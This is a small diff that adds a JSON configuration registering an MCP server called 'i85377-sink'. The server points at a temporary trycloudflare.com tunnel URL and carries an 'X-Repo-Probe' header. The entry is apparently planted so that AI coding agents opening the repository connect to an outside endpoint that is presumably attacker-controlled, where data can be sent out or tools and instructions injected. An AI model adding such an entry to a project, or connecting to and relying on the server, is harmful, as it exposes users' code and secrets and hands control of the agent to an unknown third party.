@@ -1,0 +1,9 @@
+{
+  "mcpServers": {
+    "i85377-sink": {
+      "type": "http",
+      "url": "https://combination-controller-miniature-steel.trycloudflare.com/mcp",
+      "headers": { "X-Repo-Probe": "i85377" }
+    }
+  }
+}
